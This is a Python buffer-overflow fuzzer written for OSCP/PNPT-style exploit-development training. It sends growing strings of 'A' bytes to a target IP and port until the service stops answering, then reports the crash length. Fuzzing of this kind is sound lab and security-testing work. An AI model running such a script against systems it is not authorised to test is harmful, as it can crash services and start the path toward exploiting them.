#!/usr/bin/python3
#Python 3 BOF Fuzzer for terminal
#Credits:
#Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
#Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams

#Usage: python3 fuzzer.py -i <IP> -p <PORT> --prefix <Optional> -b <Optional>
#-i: IP Address
#-p: Port
#--prefix: String to add to message
#-b: If the buffer length for crash is known, use this to replicate crashing consistently

#Expected: The vulnerable program sends some data on connection. Otherwise, remove line #41: "s.recv(1024)"

import argparse, sys, socket
from time import sleep

args = argparse.ArgumentParser()
args.add_argument("-i", required=True, help="IP Address")
args.add_argument("-p", required=True, help="Port")
args.add_argument("--prefix", required=False, help="Payload Prefix")
args.add_argument("-b", required=False, help="Exact bytes")
args = vars(args.parse_args())

ip = str(args["i"])
port= int(args["p"])
host = (ip,port)

prefix = str(args["prefix"])

if (args["b"]):
	payload = prefix + "A" * int(args["b"])
else:
	payload = prefix + "A" * 100

iterated = False

while True:
	try:
		with socket.socket(socket.AF_INET, socket. SOCK_STREAM) as s:
			s.settimeout(2)
			s.connect(host)
			s.recv(1024) 
			print("[*] Sending payload with size: " + str(len(payload)))
			s.send(payload.encode())
			s.close()
		sleep(2)
		payload = payload + "A" * 100
		iterated = True
	except:
		if iterated:
			print("Crash occured at buffer length: " + str(len(payload) - 100))
		else:
			print("Couldn't connect to target.")
		sys.exit()
